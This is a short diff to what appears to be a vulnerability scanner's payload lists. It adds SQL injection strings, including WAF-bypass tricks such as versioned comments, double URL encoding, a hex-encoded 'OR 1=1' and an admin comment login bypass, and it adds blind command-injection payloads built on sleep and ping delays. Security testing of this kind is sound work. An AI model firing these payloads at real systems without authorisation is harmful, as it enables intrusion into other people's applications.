@@ -26,6 +26,11 @@ SQLI_ERROR = [
     "\\",
     "%27",
     "%27 OR %271%27=%271",
+    # Advanced WAF Bypasses
+    "/*!50000SELECT*/",
+    "%2527",                      # Double URL encode single quote
+    "0x27204f5220313d31",         # Hex encoded "' OR 1=1"
+    "admin'/*foo*/--",
 ]
 
 SQLI_TIME = [
@@ -89,6 +94,13 @@ CMD_PAYLOADS = [
     # Null-byte + newline tricks
     f"\x00; echo {CANARY}",
     f"\n echo {CANARY}",
+    # Time-based / Blind
+    "; sleep 5",
+    "| sleep 5",
+    "`sleep 5`",
+    "$(sleep 5)",
+    "; ping -c 6 127.0.0.1",
+    "| ping -n 6 127.0.0.1",
 ]
 
 # ── SSTI ──────────────────────────────────────────────────────────────────────
